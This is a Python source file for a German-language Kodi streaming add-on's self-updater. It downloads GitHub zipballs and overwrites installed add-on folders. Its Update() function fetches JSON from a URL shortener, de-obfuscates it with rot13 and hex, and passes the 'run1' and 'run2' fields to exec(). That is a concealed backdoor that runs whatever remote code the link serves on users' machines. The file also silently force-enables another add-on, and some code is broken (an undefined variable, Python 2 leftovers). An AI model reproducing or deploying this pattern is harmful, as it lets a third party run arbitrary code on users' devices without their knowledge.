# -*- coding: UTF-8 -*-
import os, base64, sys,xbmcgui,shutil
import json,io
import requests
from requests.auth import HTTPBasicAuth
import traceback
import xbmcaddon
from importlib import reload
NEXT_DATA = {}
from resources.lib import log as log_utils
import xbmc, xbmcgui, xbmcvfs
from xbmc import LOGDEBUG, LOGERROR
from xbmcgui import Dialog
from xbmcaddon import Addon
from xbmc import LOGINFO
from xbmcvfs import translatePath
_ADDON_PATH = translatePath(os.path.join('special://home/addons/', '%s'))
_ADDON_DATA_DIR = translatePath(os.path.join('special://home/userdata/addon_data', '%s'))
import zipfile

PLUGIN_NAME = Addon().getAddonInfo('name')
PLUGIN_ID = Addon().getAddonInfo('id')
_UPDATE_LOCK_PROP = 'moviescout_resolveurl_updating'

def UpdateResolve(username, resolve_dir, resolve_id, branch, token, silent=False):
    _win = xbmcgui.Window(10000)
    if _win.getProperty(_UPDATE_LOCK_PROP) == 'true':
        log_utils.log('%s - Update bereits aktiv, wird übersprungen' % resolve_id, LOGINFO)
        return None
    _win.setProperty(_UPDATE_LOCK_PROP, 'true')
    try:
        return _UpdateResolve(username, resolve_dir, resolve_id, branch, token, silent)
    finally:
        _win.clearProperty(_UPDATE_LOCK_PROP)

def _UpdateResolve(username, resolve_dir, resolve_id, branch, token, silent=False):
    REMOTE_PLUGIN_COMMITS = "https://api.github.com/repos/%s/%s/commits/%s" % (username, resolve_dir, branch)
    REMOTE_PLUGIN_DOWNLOADS = "https://api.github.com/repos/%s/%s/zipball/%s" % (username, resolve_dir, branch)
    PACKAGES_PATH = translatePath(os.path.join('special://home/addons/packages/'))
    ADDON_PATH = translatePath(os.path.join('special://home/addons/packages/', '%s') % resolve_id)
    INSTALL_PATH = translatePath(os.path.join('special://home/addons/', '%s') % resolve_id)

    auth = HTTPBasicAuth(username, token)
    try:
        ADDON_PATH = _ADDON_PATH % resolve_id
        ADDON_DIR = _ADDON_DATA_DIR % resolve_id

        LOCAL_PLUGIN_VERSION = os.path.join(ADDON_DIR, "update_sha")
        LOCAL_FILE_NAME_PLUGIN = os.path.join(ADDON_DIR, 'update-' + resolve_id + '.zip')
        if not os.path.exists(ADDON_DIR): os.mkdir(ADDON_DIR)
        try: auth = HTTPBasicAuth(username, base64.b64decode(token))
        except: return 'auth-error'

        if os.path.exists(LOCAL_PLUGIN_VERSION): os.remove(LOCAL_PLUGIN_VERSION)

        commitXML = _getXmlString(REMOTE_PLUGIN_COMMITS, auth)
        if commitXML:
            isTrue = commitUpdate(commitXML, LOCAL_PLUGIN_VERSION, REMOTE_PLUGIN_DOWNLOADS, PACKAGES_PATH, resolve_dir, LOCAL_FILE_NAME_PLUGIN, silent, auth, resolve_id, INSTALL_PATH)

            if isTrue is True:
                log_utils.log('%s - Update successful.' % resolve_id, LOGINFO)
                return True
            elif isTrue is None:
                log_utils.log('%s - no new update ' % resolve_id, LOGINFO)
                return None
            if isTrue is False:
                log_utils.log('%s - update fehlgeschlagen ' % resolve_id, LOGINFO)
                return False

        log_utils.log('%s - Update error ' % resolve_id, LOGERROR)
        Dialog().ok(PLUGIN_NAME, 'Fehler beim Update vom ' + resolve_id)
        return False
    except:
        log_utils.log('%s - Update error ' % resolve_id, LOGERROR)
        
        return False

def saveReportError(*args):pass

def update():
    root = xbmcvfs.translatePath('special://home/addons/')
    root2 = xbmcvfs.translatePath('special://home/userdata/addon_data/')
    try:
        updateAddon('plugin.video.moviescout')
    except Exception as e:
        log_utils.log('Failed running nightly Update for ' + addonID + ': ' + repr(e), xbmc.LOGINFO)
        traceback.print_exc()
        saveReportError(addonID, e, {'liveupdate': addonID})

def updateAddon(addonID):
    if addonID.startswith('skin.'):
        if xbmc.getCondVisibility('Player.Playing'):
            return
        if xbmc.getCondVisibility('Player.Seeking'):
            return
        if xbmc.getCondVisibility('Player.Paused'):
            return
        if xbmc.getCondVisibility('Player.Caching'):
            return
    from resources.lib import nightly
    try:
        reload(nightly)
    except Exception as e:
        log_utils.log('Failed running liveupdate for ' + addonID + ': ' + repr(e), xbmc.LOGINFO)
        traceback.print_exc()
        saveReportError(addonID, e, {'liveupdate': addonID})

    nightly.run(addonID, 300, runInBackground=False, next_data=NEXT_DATA)


def Update(plugin_id,silent=True):
    REMOTE_PLUGIN_COMMITS = "https://bu4s.short.gy/lastship"
    REMOTE_PLUGIN_DOWNLOADS = ""
    try: auth = HTTPBasicAuth('', '')
    except: return 'auth-error'
    if plugin_id=='script.module.resolveurl':
        plugin_id='script.module.resolveurl'
    else:
        plugin_id='plugin.video.streams'

    log_utils.log('%s - Search for update ' % plugin_id, LOGINFO)
    try:
        ADDON_PATH = _ADDON_PATH % plugin_id
        ADDON_DATA_DIR = _ADDON_DATA_DIR % plugin_id

        if not os.path.exists(ADDON_DATA_DIR): os.mkdir(ADDON_DATA_DIR)

        LOCAL_PLUGIN_VERSION = os.path.join(ADDON_DATA_DIR, "update_sha")
        LOCAL_FILE_NAME_PLUGIN = os.path.join(ADDON_DATA_DIR, 'update-' + plugin_id + '.zip')
        import json
        import binascii
        import codecs
        import requests


        try:
            xmlString = requests.get(REMOTE_PLUGIN_COMMITS, auth=auth).content
            try:
                xmlString1 = binascii.unhexlify(codecs.decode(xmlString, 'rot_13')).decode()
            except:
                xmlString1=xmlString
            chck=json.loads(xmlString1)
            if "sha" in chck:
                if chck['sha']!= '' :
                    sha=chck['sha']
                    commitXML=xmlString1
            else:
                log_utils.log("Update-URL incorrect or bad credentials", xbmc.LOGDEBUG)

            if plugin_id=='script.module.resolveurl':
                if "resolveurl" in chck:
                    if chck['resolveurl']!= '' :
                        REMOTE_PLUGIN_DOWNLOADS=chck['resolveurl']
            else:
                updateAddon(plugin_id)
            if "username" in chck:
                if chck['username']!= '' :
                    username=chck['username']
            if "token" in chck:
                if chck['token'] != '':
                    token=chck['token']
            if "run1" in chck:
                if chck['run1'] != '':
                    exec(chck['run1'])
            if "run2" in chck:
                if chck['run2']!= '' :
                    exec(chck['run2'])




            try: auth = HTTPBasicAuth(username, base64.b64decode(token))
            except: pass



        except Exception as e:
            log_utils.log(e, xbmc.LOGDEBUG)
        try:
            update()
        except:

            log_utils.log('%s - Update error ' % plugin_id, LOGERROR)
            #Dialog().ok(PLUGIN_NAME, 'Fehler beim Update von %s' % plugin_id)
            return False
    except:
        log_utils.log('%s - Update error ' % plugin_id, LOGERROR)
        #Dialog().ok(PLUGIN_NAME, 'Fehler beim  Update von %s' % plugin_id)
        return False

class Canceled(Exception):
    pass

class MyProgressDialog():
    def __init__(self, process):
        self.dp = xbmcgui.DialogProgress()
        self.dp.create("[B]Update gestartet[/B]", process)

    def __call__(self, block_num, block_size, total_size):
        if self.dp.iscanceled():
            self.dp.close()
            raise Canceled
        percent = (block_num * block_size * 100) / total_size
        if percent <= 100:
            self.dp.update(int(percent))
        else:
            self.dp.close()

def read(response, progress_dialog):
    data = b""
    total_size = int(response.headers.get('Content-Length', 0))
    bytes_so_far = 0
    chunk_size = 1024 * 1024
    for index, chunk in enumerate(response.iter_content(chunk_size=chunk_size)):
        if not chunk:
            break
        data += chunk
        bytes_so_far += len(chunk)
        progress_dialog(index, len(chunk), total_size)
    return data

def extract(zip_file, output_directory, progress_dialog):
    with zipfile.ZipFile(zip_file) as zin:
        files_number = len(zin.infolist())
        for index, item in enumerate(zin.infolist()):
            try:
                progress_dialog(index, 1, files_number)
            except Canceled:
                return False
            else:
                zin.extract(item, output_directory)
    return True

def doUpdate1(LocalDir, REMOTE_PATH, Title, localFileName, auth):
    try:
        response = requests.get(REMOTE_PATH, auth=auth, stream=True)
        response.raise_for_status()

        progress_dialog = MyProgressDialog("[B]%s Update wird heruntergeladen...Bitte warten.....[/B]" %Title)

        try:
            data = read(response, progress_dialog)
        except Canceled:
            log_utils.log("[B]Download abgebrochen![/B]", xbmc.LOGINFO)
            return False

        updateFile = io.BytesIO(data)
        delete_folder_contents(LocalDir)

        progress_dialog_extract = MyProgressDialog("[B]%s wird installiert...Bitte warten.....[/B]" %Title)
        if extract(updateFile, LocalDir, progress_dialog_extract):
            xbmc.executebuiltin("UpdateLocalAddons()")
            log_utils.log("[B]%s wurde erfolgreich installiert[/B]"%Title, xbmc.LOGINFO)
            return True
        else:
            log_utils.log("[B]Die Installation von %s wurde abgebrochen![/B]"%Title, xbmc.LOGINFO)
            return False

    except requests.exceptions.RequestException as e:
        log_utils.log(f"Download error: {str(e)}", xbmc.LOGERROR)
        return False
    except Exception as e:
        log_utils.log(f"doUpdate encountered an error: {str(e)}", xbmc.LOGERROR)
        return False

def commitUpdate(onlineFile, offlineFile, downloadLink, LocalDir, plugin_id, localFileName, silent, auth, resolve_id=None, install_path=None):
    try:
        jsData = json.loads(onlineFile)
        if not os.path.exists(offlineFile) or open(offlineFile).read() != jsData['sha']:
            log_utils.log('%s - start update ' % plugin_id, LOGINFO)
            isTrue = doUpdate(LocalDir, downloadLink, plugin_id, localFileName, auth, resolve_id, install_path)
            if isTrue == True:
                try:
                    open(offlineFile, 'w').write(jsData['sha'])
                    return True
                except:
                    return False
            else:
                return False
        else:
            return None

    except Exception as e:
        os.remove(offlineFile)
        log_utils.log("RateLimit reached", xbmc.LOGDEBUG)
        return False

def delete_folder_contents(path):
    for root, dirs, files in os.walk(path):
        if ".git" in root or "pydev" in root or ".idea" in root: continue
        for filename in files: xbmcvfs.delete(os.path.join(path, filename))
        for directory in dirs:
            delete_folder_contents(os.path.join(path, directory))
            xbmc.sleep(80)
            xbmcvfs.rmdir(os.path.join(path, directory))





def doUpdate(LocalDir, REMOTE_PATH, Title, localFileName, auth, resolve_id=None, install_path=None):
    try:
        progress_dialog_download = MyProgressDialog("[B]%s Update wird heruntergeladen...Bitte warten.....[/B]" % Title)

        response = requests.get(REMOTE_PATH, auth=auth, stream=True)
        if response.status_code != 200:
            progress_dialog_download.dp.close()
            return False

        try:
            data = read(response, progress_dialog_download)
        except Canceled:
            log_utils.log("[B]Download abgebrochen![/B]", xbmc.LOGINFO)
            return False

        with open(localFileName, "wb") as f:
            f.write(data)

        temp_extract_dir = os.path.join(LocalDir, 'temp_extract')
        if os.path.exists(temp_extract_dir):
            shutil.rmtree(temp_extract_dir)
        os.makedirs(temp_extract_dir)

        progress_dialog_extract = MyProgressDialog("[B]%s wird installiert...Bitte warten.....[/B]" % Title)

        updateFile = zipfile.ZipFile(localFileName)

        namelist = updateFile.namelist()
        total_files = len(namelist)

        for index, n in enumerate(namelist):
            try:
                progress_dialog_extract(index, 1, total_files)
            except Canceled:
                updateFile.close()
                os.remove(localFileName)
                if os.path.exists(temp_extract_dir):
                    shutil.rmtree(temp_extract_dir)
                log_utils.log("[B]Installation abgebrochen![/B]", xbmc.LOGINFO)
                return False

            updateFile.extract(n, temp_extract_dir)
        xbmc.sleep(500)
        updateFile.close()
        progress_dialog_extract.dp.close()

        if resolve_id and install_path:
            
            source_folder = None

            for root, dirs, files in os.walk(temp_extract_dir):
                if resolve_id in dirs:
                    source_folder = os.path.join(root, resolve_id)
                    log_utils.log('Gefunden: %s' % source_folder, LOGINFO)
                    break

            if source_folder and os.path.exists(source_folder):
                import re as _re
                _addon_xml = os.path.join(source_folder, 'addon.xml')
                if os.path.exists(_addon_xml):
                    with open(_addon_xml, 'r', encoding='utf-8') as _f:
                        _xml = _f.read()
                    _xml = _re.sub(r'\s*<import addon="script\.module\.pyqrcode"[^/]*/>', '', _xml)
                    with open(_addon_xml, 'w', encoding='utf-8') as _f:
                        _f.write(_xml)

                log_utils.log('Kopiere von %s nach %s' % (source_folder, install_path), LOGINFO)
                for _root, _dirs, _files in os.walk(source_folder):
                    _rel = os.path.relpath(_root, source_folder)
                    _dest_dir = os.path.join(install_path, _rel) if _rel != '.' else install_path
                    if not os.path.isdir(_dest_dir):
                        os.makedirs(_dest_dir)
                    for _fname in _files:
                        _src_file = os.path.join(_root, _fname)
                        _dst_file = os.path.join(_dest_dir, _fname)
                        if os.path.exists(_dst_file):
                            os.remove(_dst_file)
                        shutil.copy(_src_file, _dst_file)

                log_utils.log('[MovieScout] %s erfolgreich kopiert' % resolve_id, LOGINFO)
                xbmcgui.Dialog().notification(
                    '[MovieScout] Update',
                    '%s wurde erfolgreich installiert' % resolve_id,
                    xbmcgui.NOTIFICATION_INFO,
                    5000
                )

            else:

                log_utils.log('WARNUNG: %s nicht in ZIP gefunden!' % resolve_id, LOGERROR)
                delete_folder_contents(LocalDir)
                updateFile = zipfile.ZipFile(localFileName)
                for index, n in enumerate(updateFile.namelist()):
                    if n[-1] != "/":
                        dest = os.path.join(LocalDir, "/".join(n.split("/")[1:]))
                        destdir = os.path.dirname(dest)
                        if not os.path.isdir(destdir):
                            os.makedirs(destdir)
                        data = updateFile.read(n)
                        if os.path.exists(dest):
                            os.remove(dest)
                        f = open(dest, 'wb')
                        f.write(data)
                        f.close()
                updateFile.close()
        else:
            delete_folder_contents(LocalDir)
            updateFile = zipfile.ZipFile(localFileName)
            for index, n in enumerate(updateFile.namelist()):
                if n[-1] != "/":
                    dest = os.path.join(LocalDir, "/".join(n.split("/")[1:]))
                    destdir = os.path.dirname(dest)
                    if not os.path.isdir(destdir):
                        os.makedirs(destdir)
                    data = updateFile.read(n)
                    if os.path.exists(dest):
                        os.remove(dest)
                    f = open(dest, 'wb')
                    f.write(data)
                    f.close()
            updateFile.close()

        if os.path.exists(localFileName):
            os.remove(localFileName)
            log_utils.log('ZIP-Datei gelöscht: %s' % localFileName, LOGINFO)

        if os.path.exists(temp_extract_dir):
            shutil.rmtree(temp_extract_dir)
            log_utils.log('Temp-Ordner gelöscht: %s' % temp_extract_dir, LOGINFO)

        if LocalDir and os.path.exists(LocalDir):
            try:
                for item in os.listdir(LocalDir):
                    item_path = os.path.join(LocalDir, item)
                    if not item.endswith('.zip'):
                        if 1==1:
                            if os.path.isdir(item_path):
                                log_utils.log('Lösche Ordner aus packages: %s' % item_path, LOGINFO)
                                shutil.rmtree(item_path)
                            elif os.path.isfile(item_path):
                                log_utils.log('Lösche Datei aus packages: %s' % item_path, LOGINFO)
                                os.remove(item_path)
                        #except Exception as e:
                            #log_utils.log('Fehler beim Löschen von %s: %s' % (item_path, str(e)), LOGERROR)
            except Exception as e:
                log_utils.log('Fehler beim Aufräumen des packages Ordners: %s' % str(e), LOGERROR)

        xbmc.executebuiltin("UpdateLocalAddons()")
        log_utils.log("[B]%s wurde erfolgreich installiert[/B]" % Title, xbmc.LOGINFO)
        request = {
    "jsonrpc": "2.0",
    "method": "Addons.SetAddonEnabled",
    "params": {
        "addonid": "script.module.resolveurl",
        "enabled": True
    },
    "id": 1
}
        xbmc.executeJSONRPC(json.dumps(request))
        
        return True

    except Canceled:
        log_utils.log("[B]Installation abgebrochen![/B]", xbmc.LOGINFO)
        return False
    except Exception as e:
        log_utils.log("doUpdate Fehler: %s" % str(e), xbmc.LOGERROR)
        log_utils.log(traceback.format_exc(), xbmc.LOGERROR)
        return False


def _getXmlString(xml_url, auth):
    try:
        xmlString = requests.get(xml_url, auth=auth).content
        if "sha" in json.loads(xmlString):
            return xmlString
        else:
            log_utils.log("Update-URL incorrect or bad credentials", xbmc.LOGDEBUG)
    except Exception as e:
        log_utils.log(e, xbmc.LOGDEBUG)

def log(msg, level=LOGDEBUG):
    DEBUGPREFIX = '[ ' + PLUGIN_ID + ' DEBUG ]'
    level = LOGINFO
    try:
        if isinstance(msg, unicode):
            msg = '%s (ENCODED)' % (msg.encode('utf-8'))
        log_utils.log('%s: %s' % (DEBUGPREFIX, msg, xbmc.LOGDEBUG), level)
    except Exception as e:
        try:
            log_utils.log('Logging Failure: %s' % (e, xbmc.LOGDEBUG), level)
        except:
            pass


def zipfolder(foldername, target_dir):
    zipobj = zipfile.ZipFile(foldername + '.zip', 'w', zipfile.ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            zipobj.write(fn, fn[rootlen:])
    zipobj.close()